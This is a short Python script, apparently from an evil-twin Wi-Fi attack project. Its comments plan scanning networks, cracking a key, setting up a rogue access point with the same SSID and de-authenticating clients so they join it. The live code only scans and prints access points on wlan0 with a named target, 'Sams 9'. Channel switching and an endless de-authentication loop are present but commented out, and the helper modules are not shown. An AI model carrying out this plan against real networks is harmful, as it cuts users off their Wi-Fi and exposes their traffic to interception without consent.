# Get SSIDS in wifi medium (scan network)

# Choose one SSID to emulate - e.g. based on WPA2, name, number of clients connected to it

# Can we crack the key in order to create our own AP? if not go to next..

# Create rogue AP with same SSID+key

# Send beacon frames where we look like good AP (but we are the bad AP)

# De-auth clients connected to SSID

# Let clients connect to our rogue AP

from scanner import Scanner

INTERFACE = "wlan0"
TIMEOUT = 5

AP_TO_ATTACK = "Sams 9"

with Scanner(INTERFACE) as scanner:
    AP_info = scanner.get_ap(timeout=TIMEOUT)
    print(AP_info)
    print(scanner.wifis)

# set_interface_to_monitor_mode(INTERFACE)

# AP_info = get_ap(timeout=TIMEOUT, interface=INTERFACE)#, specific_ap=AP_TO_ATTACK)

# print(AP_info)

# channel = AP_info.Channel[0]
# BSSID = AP_info.index[0]

# print(AP_info.Channel)
# print(BSSID[0])
# # change channel to be on APs channel
# os.system(f"iwconfig {INTERFACE} channel {channel}")
# # clients = get_clients_on_ap(timeout=10, iface=INTERFACE, BSSID=BSSID)

# # Deauth clients
# while True:
#     print("Deauthenticating clients...")
#     reason_code = random.randint(1, 68)
#     deauth_clients(iface=INTERFACE, clients=clients, AP_mac=BSSID, reasoncode=reason_code)
